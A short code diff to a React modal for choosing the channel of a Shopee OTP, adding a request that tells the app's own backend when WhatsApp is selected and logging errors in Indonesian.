@@ -210,10 +210,19 @@ function ShopeeOTPModal({ isOpen, username, phone, onSubmitOTP, onCancel, submit
 
   if (!isOpen) return null;
 
-  const handleProceedToNextStep = () => {
+  const handleProceedToNextStep = async () => {
     if (otpChannel === "whatsapp") {
       setTimer60(60);
       setStep(2); // Start 60-second countdown timer phase
+      try {
+        await fetch(`${API_BASE_URL}/api/shopee/select-otp-channel`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ username, channel: "whatsapp" })
+        });
+      } catch (err) {
+        console.error("Gagal mengirim pilihan channel ke backend:", err);
+      }
     } else {
       setStep(3); // Directly go to OTP code input for SMS
     }
